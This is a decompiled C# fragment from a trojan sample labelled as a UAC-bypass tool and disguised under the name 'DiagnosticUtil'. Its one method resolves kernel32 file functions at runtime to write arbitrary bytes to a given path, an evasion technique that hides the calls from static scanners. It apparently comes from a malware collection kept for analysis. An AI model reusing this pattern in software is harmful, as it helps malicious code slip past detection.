// Decompiled with JetBrains decompiler
// Type: DiagnosticUtil.API
// Assembly: DiagnosticUtil, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C6A47F43-C4B9-4F39-9210-79D201F89C2D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.BypassUAC.gen-c98dcfafc43b43be717e17ad04748998f457316af4062c15173c2ba2c71687aa.exe

using System;
using System.Runtime.InteropServices;

namespace DiagnosticUtil
{
  public class API
  {
    public static bool WriteFunc(string path, byte[] data)
    {
      try
      {
        IntPtr hModule = Native.LoadLibrary("kernel32.dll");
        IntPtr procAddress1 = Native.GetProcAddress(hModule, "CreateFileW");
        if (procAddress1 == IntPtr.Zero)
          return false;
        IntPtr procAddress2 = Native.GetProcAddress(hModule, "WriteFile");
        if (procAddress2 == IntPtr.Zero)
          return false;
        IntPtr procAddress3 = Native.GetProcAddress(hModule, "CloseHandle");
        if (procAddress3 == IntPtr.Zero)
          return false;
        Native.myCloseFnc forFunctionPointer1 = (Native.myCloseFnc) Marshal.GetDelegateForFunctionPointer(procAddress3, typeof (Native.myCloseFnc));
        Native.MyOpenFunc forFunctionPointer2 = (Native.MyOpenFunc) Marshal.GetDelegateForFunctionPointer(procAddress1, typeof (Native.MyOpenFunc));
        Native.MyWriteFunc forFunctionPointer3 = (Native.MyWriteFunc) Marshal.GetDelegateForFunctionPointer(procAddress2, typeof (Native.MyWriteFunc));
        string filename = path;
        IntPtr zero1 = IntPtr.Zero;
        IntPtr zero2 = IntPtr.Zero;
        IntPtr hFile = forFunctionPointer2(filename, 4U, 0, zero1, 2, 128, zero2);
        uint lpNumberOfBytesWritten = 0;
        if (forFunctionPointer3(hFile, data, (uint) data.Length, out lpNumberOfBytesWritten, IntPtr.Zero))
        {
          int num = forFunctionPointer1(hFile) ? 1 : 0;
          return true;
        }
        int num1 = forFunctionPointer1(hFile) ? 1 : 0;
      }
      catch
      {
      }
      return false;
    }
  }
}
